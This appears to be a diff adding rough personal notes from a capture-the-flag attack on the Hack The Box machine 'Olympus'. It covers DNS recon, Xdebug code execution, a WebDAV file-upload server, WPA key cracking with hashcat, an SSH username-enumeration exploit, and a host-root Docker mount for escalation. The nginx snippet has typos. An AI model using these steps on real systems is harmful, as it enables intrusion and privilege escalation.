@@ -1,0 +1,49 @@
+nslookup
+    server 10.10.10.83
+    olympus.htb
+
+
+dnsenum.sh
+dnsrecon -n 10.10.10.83 -r 10.0.0.0/8 --db olympus.db
+dnsrecon -n 10.10.10.83 -r 172.16/12 --db olympus.db
+dnsrecon -n 10.10.10.83 -r 192.168/16--db olympus.db
+
+xdbbug chrome xdebug
+have code execution on the xdebug
+
+
+nginx upload
+
+cd /etc/nginx
+cat default  > file_upload
+server{
+    listen 8001 default server;
+    server_name whatever;
+    locate / {
+        root /var/www/upload;
+        dav_methods PUT;
+    }
+}
+
+curl --upload-file filename ip:port
+that is good way upload file 
+
+wpa-key 
+
+hashcat-utils github
+cap2hccapx.bin  --> to hashcat
+
+wireshark --> preference --> protoclos-
+IEEE802.11---wpa-pwd--key
+enable-decrypt
+ssh brup usename cve
+google the cve github
+
+python sshUsernameEnumExploit.py --port 2222 --userlist exampleInput.txt 10.10.10.83
+greek mythological characters
+
+
+docker containers --help 
+docker run -ti olympia bash 
+docker run -v /:/mnt/adsf -ti olympia bash
+
